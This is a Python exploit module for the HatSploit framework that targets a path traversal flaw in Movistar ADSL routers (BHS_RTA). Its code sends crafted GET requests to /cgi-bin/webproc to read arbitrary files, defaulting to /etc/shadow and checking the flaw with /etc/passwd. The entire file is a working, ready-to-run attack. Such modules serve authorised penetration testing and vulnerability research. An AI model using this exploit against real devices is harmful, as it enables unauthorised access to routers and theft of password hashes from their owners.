#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from pex.client.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    details = {
        'Category': "exploit",
        'Name': "Movistar ADSL Path Traversal",
        'Module': "exploit/linux/movistar/adsl_path_traversal",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer',
            'Todor Donev - vulnerability researcher'
        ],
        'Description': "Path Traversal in Movistar ADSL router BHS_RTA.",
        'Platform': "linux",
        'Rank': "high"
    }

    options = {
        'HOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'PORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Type': "port",
            'Required': True
        },
        'RFILE': {
            'Description': "Remote file to read.",
            'Value': "/etc/shadow",
            'Type': None,
            'Required': True
        }
    }

    def exploit(self, remote_host, remote_port, remote_file):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path=f'/cgi-bin/webproc?getpage={remote_file}&var:language=es_es&var:page='
        )

        if response.text:
            self.print_empty(f"\n{response.text}")
        else:
            self.print_warning("File is empty.")

    def check(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/cgi-bin/webproc?getpage=/etc/passwd&var:language=es_es&var:page='
        )

        if not response or response.status_code != 200:
            self.print_error("Target is not vulnerable!")
            return False

        return True

    def run(self):
        remote_host, remote_port, remote_file = self.parse_options(self.options)

        self.print_process(f"Exploiting {remote_host}...")
        if not self.check(remote_host, remote_port):
            return

        self.exploit(remote_host, remote_port, remote_file)
